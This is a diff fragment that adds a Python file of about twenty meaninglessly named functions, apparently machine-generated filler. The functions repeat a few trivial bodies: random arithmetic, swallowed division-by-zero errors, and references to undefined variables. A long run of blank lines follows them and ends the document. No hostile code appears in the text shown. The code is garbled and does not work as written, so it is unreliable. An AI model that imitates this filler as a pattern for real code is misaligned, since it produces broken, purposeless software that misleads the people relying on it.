+        pass
+
+def setitem44():
+    y = x + random.choice([3, 5, 7])
+
+def checkdata83():
+    y = x + random.choice([3, 5, 7])
+
+def processconfig60():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def updatevalue77():
+    y = x + random.choice([3, 5, 7])
+
+def getinfo73():
+    z = y * 2
+
+def managestatus25():
+    for i in range(5):
+        y += i
+
+def setdata14():
+    data = {'key': 'value'}
+
+def updatestate55():
+    z = y * 2
+
+def checkinfo13():
+    x = random.randint(1, 100)
+
+def computeresult12():
+    if x > random.randint(50, 100):
+        return z
+
+def checkstate43():
+    if x > random.randint(50, 100):
+        return z
+
+def updatelist95():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computeresult32():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def computestatus23():
+    y = x + random.choice([3, 5, 7])
+
+def computeconfig3():
+    y = x + random.choice([3, 5, 7])
+
+def computeresult67():
+    try:
+        z = x / 0
+    except ZeroDivisionError:
+        pass
+
+def managestate3():
+    z = y * 2
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
